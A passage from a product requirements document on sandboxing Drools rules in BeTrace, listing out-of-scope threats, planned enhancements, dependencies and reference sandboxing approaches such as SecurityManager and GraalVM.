   - ❌ Blocked: Class.forName() and ClassLoader not accessible
   - ✅ Evidence: CLASS_LOADING_VIOLATION (MEDIUM severity)

**Threat Model - NOT Protected (Out of Scope):**
1. **Denial of service (infinite loops in rules)**
   - Requires: Rule execution timeout mechanism (future PRD)
   - Mitigation: Drools has circuit breakers, but not enforced yet

2. **Resource exhaustion (too many signals)**
   - Requires: Rate limiting per tenant (PRD-007)
   - Mitigation: Monitor signal creation rates in metrics

3. **Logic bombs (time-based malicious behavior)**
   - Requires: Rule behavior analysis and anomaly detection
   - Mitigation: Audit trail enables post-incident forensics

**Future Enhancements:**
1. **Per-tenant capability quotas:** Max signals per minute, max log entries per hour
2. **Rule complexity analysis:** Prevent computationally expensive rules from deployment
3. **Runtime monitoring:** Circuit breakers for rule execution time/memory
4. **ClassLoader isolation:** Separate classloader per tenant for additional isolation
5. **Sandbox escape detection:** Monitor JVM security manager violations (if re-enabled)

## Dependencies

**Requires:**
- PRD-002: TigerBeetle for audit event persistence (ADR-011)
- PRD-003: Compliance span signing for tamper-evident evidence

**Blocks:**
- PRD-010: Rule Management UI (users need to understand capability limits)
- PRD-014: Developer Rule Testing (tests must run within sandbox constraints)

**Related:**
- PRD-007: API Input Validation & Rate Limiting (rate limit signal creation per tenant)
- ADR-013: Camel-First Architecture (audit logging as Camel routes)
- ADR-014: Named Processors (all sandbox logic as testable processors)
- ADR-015: Tiered Storage (audit events flow through TigerBeetle → DuckDB → Parquet)

## Public Examples

### 1. Java SecurityManager Patterns (Historical Reference)
**URL:** https://docs.oracle.com/javase/tutorial/essential/environment/security.html

**Relevance:** Classic JVM sandboxing approach demonstrating permission-based security models applicable to rule isolation. **Note:** SecurityManager is deprecated in Java 17+ but provides foundational concepts for capability-based security.

**Key Patterns:**
- Permission-based access control
- Security policy files defining allowed operations
- `checkPermission()` enforcement at API boundaries
- Thread-based security contexts

**BeTrace Adaptation:** While SecurityManager is obsolete, its permission model informs BeTrace's RuleCapabilities interface (whitelist approach). Modern alternative: GraalVM sandboxing.

**Caveat:** Deprecated technology—included for historical context only. Use GraalVM for modern sandboxing.

### 2. Drools Security Best Practices
**URL:** https://docs.drools.org/

**Relevance:** Official guidance from Apache Drools on preventing malicious rule execution. Directly addresses Drools-specific security concerns relevant to BeTrace's rule engine.

**Key Patterns:**
- Limiting rule access to globals (avoid exposing full services)
- Input validation for rule definitions
- Resource limits (execution time, memory)
- Audit logging of rule evaluations

**BeTrace Implementation:** BeTrace's SafeRuleCapabilities proxy implements Drools' recommended pattern of controlled global access.

### 3. GraalVM Polyglot Sandboxing
**URL:** https://www.graalvm.org/security-guide/

**Relevance:** Modern JVM sandboxing for untrusted code execution. Demonstrates capability-based security and context isolation superior to deprecated SecurityManager.

**Key Patterns:**
- Context isolation with `allowAllAccess(false)`
- Resource limits (CPU time, memory, IO)
- Capability-based security model
- Multi-language sandboxing (polyglot support)

**BeTrace Future:** If BeTrace migrates from Drools to GraalVM Truffle languages, this provides the sandboxing model. Currently informs ThreadLocal context isolation strategy.
